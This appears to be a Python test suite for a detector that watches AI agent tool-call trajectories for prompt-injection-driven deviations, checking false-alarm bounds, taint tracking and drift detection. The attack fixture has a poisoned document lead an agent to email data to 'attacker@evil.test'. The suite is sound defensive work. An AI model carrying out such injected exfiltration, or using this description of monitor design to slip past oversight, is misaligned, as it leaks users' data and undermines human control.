"""Offline tests for the goal-conditional trajectory-security detector.

Covers each layer and the end-to-end escalation, and pins the property that
makes the design SOTA rather than a threshold hack: the conformal false-alarm
rate stays at or below alpha on held-out benign data.
"""
from __future__ import annotations

import random

from clayseal.capabilities.monitor import (
    Action,
    ConformalCalibrator,
    ContextItem,
    NGramScorer,
    TaintTracker,
    Trajectory,
    TrajectoryDetector,
    TrustLevel,
    TypedGoalEnvelope,
)
from clayseal.capabilities.scoping.goal import GoalSpec


# --------------------------------------------------------------------------- #
# Synthetic trajectory generator: benign follows a per-goal pattern; attacks
# inject an off-pattern step. Mirrors what the benchmark does with real data.
# --------------------------------------------------------------------------- #
def _goal() -> GoalSpec:
    return GoalSpec(
        query_id="q1",
        summary="review and update the project records",
        allow_resources=["mcp:tool:read_record", "mcp:tool:update_record"],
        structured_intent={"kind": "records-update", "verbs": ["read", "update"]},
    )


def _benign(step_seed: int) -> Trajectory:
    rng = random.Random(step_seed)
    goal = _goal()
    actions = [
        Action(0, "read_record", "mcp:tool:read_record", "read"),
        Action(1, "read_record", "mcp:tool:read_record", "read"),
        Action(2, "update_record", "mcp:tool:update_record", "update",
               args={"id": rng.randint(1, 9)}),
    ]
    return Trajectory(goal=goal, actions=actions)


def _attack_exfil() -> Trajectory:
    goal = _goal()
    ctx = ContextItem("doc7", TrustLevel.UNTRUSTED, introduced_at_step=1,
                      summary="poisoned record note")
    actions = [
        Action(0, "read_record", "mcp:tool:read_record", "read"),
        Action(1, "read_record", "mcp:tool:read_record", "read"),
        # Injected step: exfiltrate via an unrelated tool, driven by untrusted ctx.
        Action(2, "send_email", "mcp:tool:send_email", "send",
               args={"to": "attacker@evil.test"}, derived_from=("doc7",)),
    ]
    return Trajectory(goal=goal, actions=actions, context=[ctx])


def _detector(alpha: float = 0.1) -> TrajectoryDetector:
    det = TrajectoryDetector(scorer=NGramScorer(), alpha=alpha)
    det.fit([_benign(i) for i in range(200)])
    return det


# --------------------------------------------------------------------------- #
# Layer units
# --------------------------------------------------------------------------- #
def test_envelope_flags_out_of_surface_action():
    env = TypedGoalEnvelope.from_goal(_goal())
    good = Action(0, "read_record", "mcp:tool:read_record", "read")
    bad = Action(1, "send_email", "mcp:tool:send_email", "send")
    assert env.assess(good).in_envelope
    assert not env.assess(bad).in_envelope


def test_taint_escalates_untrusted_consequential_action():
    ctx = [ContextItem("d1", TrustLevel.UNTRUSTED, introduced_at_step=0)]
    tracker = TaintTracker(ctx)
    consequential = Action(1, "send_email", "mcp:tool:send_email", "send",
                           derived_from=("d1",))
    benign_read = Action(1, "read_record", "mcp:tool:read_record", "read",
                         derived_from=("d1",))
    assert tracker.assess(consequential).escalate
    assert not tracker.assess(benign_read).escalate  # tainted but not consequential


def test_ngram_scores_offpattern_higher():
    scorer = NGramScorer().fit([_benign(i) for i in range(100)])
    benign_surprise = scorer.surprise(_benign(999))[-1].surprise
    attack_surprise = scorer.surprise(_attack_exfil())[-1].surprise
    assert attack_surprise > benign_surprise


def test_conformal_false_alarm_rate_at_most_alpha():
    rng = random.Random(0)
    cal = [rng.gauss(0.0, 1.0) for _ in range(500)]
    calib = ConformalCalibrator().fit(cal)
    fresh = [rng.gauss(0.0, 1.0) for _ in range(4000)]
    alpha = 0.1
    flagged = sum(calib.flag(x, alpha=alpha) for x in fresh)
    # Conformal guarantee: expected benign flag rate <= alpha. Allow sampling slack.
    assert flagged / len(fresh) <= alpha + 0.03


# --------------------------------------------------------------------------- #
# End-to-end
# --------------------------------------------------------------------------- #
def test_detector_blocks_injection_trajectory():
    det = _detector(alpha=0.1)
    report = det.assess(_attack_exfil())
    assert report.blocked
    assert report.first_block_step == 2


def test_detector_holds_benign_false_block_under_alpha():
    alpha = 0.1
    det = _detector(alpha=alpha)
    held_out = [_benign(10_000 + i) for i in range(300)]
    blocked = sum(det.assess(t).blocked for t in held_out)
    assert blocked / len(held_out) <= alpha + 0.05


def test_structural_tiers_catch_in_scope_attacks_on_long_trajectories():
    # The Waymo path envelope + AML analytics catch in-scope subversion that the
    # per-action floor allows, using only trajectory shape (injection-resistant).
    import random

    from clayseal.capabilities.monitor.training.synth_corpus import (
        IN_SCOPE_ATTACKS,
        generate,
    )

    benign = generate(1000, seed=1)
    det = TrajectoryDetector(scorer=NGramScorer(), alpha=0.02)
    det.fit(benign)

    # Benign held-out trajectories stay inside the corridor.
    held_out = generate(300, seed=99)
    fb = sum(det.assess(t).blocked for t in held_out)
    assert fb / len(held_out) <= 0.10, f"benign false-block too high: {fb}"

    # Each in-scope attack shape is caught by the structural tiers.
    rng = random.Random(0)
    for name, inject in IN_SCOPE_ATTACKS.items():
        applicable = caught = 0
        for t in generate(60, seed=7):
            attacked = inject(t, rng)
            if attacked is t:
                continue  # attack not applicable to this workflow shape
            applicable += 1
            if det.assess(attacked).blocked:
                caught += 1
        assert applicable > 0, f"{name}: never applicable"
        assert caught >= 0.6 * applicable, f"{name}: caught {caught}/{applicable}"


def test_detector_has_no_llm_adjudicator():
    # The trust boundary must not contain a content-reading judge (injectable).
    import clayseal.capabilities.monitor as m

    assert not hasattr(m, "Adjudicator") and not hasattr(m, "StubAdjudicator")
    assert "AmlAnalytics" in m.__all__ and "PathEnvelope" in m.__all__


def test_trajectory_conformal_bounds_heldout_false_block():
    # Split-conformal + trajectory-level aggregation must keep the benign block
    # rate near alpha on HELD-OUT data (the per-step OR previously inflated it to
    # ~1-(1-alpha)^length on long trajectories).
    from clayseal.capabilities.monitor.training.synth_corpus import generate

    trajs = generate(2000, seed=5)
    train, test = trajs[:1400], trajs[1400:]
    det = TrajectoryDetector(scorer=NGramScorer(), alpha=0.05)
    det.fit(train)
    fb = sum(det.assess(t).blocked for t in test) / len(test)
    assert fb <= 0.15, f"held-out benign false-block too high: {fb:.2%}"


def test_tau2_and_bfcl_loaders_bucket_by_goal_type():
    import pytest

    from benchmarks.datasets.bfcl import BfclLoader
    from benchmarks.datasets.tau2 import Tau2Loader

    try:
        tau2 = Tau2Loader().load(limit=300)
        bfcl = BfclLoader().load(limit=300)
    except RuntimeError:
        pytest.skip("tau2/bfcl corpus not present")
    assert tau2 and all(t.meta["goal_kind"].startswith("tau2:") for t in tau2)
    assert bfcl and all(t.meta["goal_kind"].startswith("bfcl:") for t in bfcl)
    # Domains are real, well-sampled buckets.
    assert len({t.meta["goal_kind"] for t in tau2}) >= 2


def test_cusum_accumulates_sustained_drift_beyond_a_single_point():
    # SPC property: CUSUM fires on a sustained small shift that a single-point
    # (max) check of the same magnitude misses. Honest scope for the drift tier.
    import random

    from clayseal.capabilities.monitor.drift import CusumDrift

    rng = random.Random(0)
    benign = [("b", [rng.gauss(0.0, 1.0) for _ in range(12)]) for _ in range(400)]
    drift = CusumDrift().fit(benign)

    sustained = [1.5] * 12                 # each mildly high, none extreme
    one_spike = [0.0] * 11 + [1.5]         # same per-step max, no accumulation
    assert drift.statistic("b", sustained) > drift.statistic("b", one_spike)
    assert drift.p_value("b", sustained) <= 0.05
    assert drift.p_value("b", one_spike) > 0.05
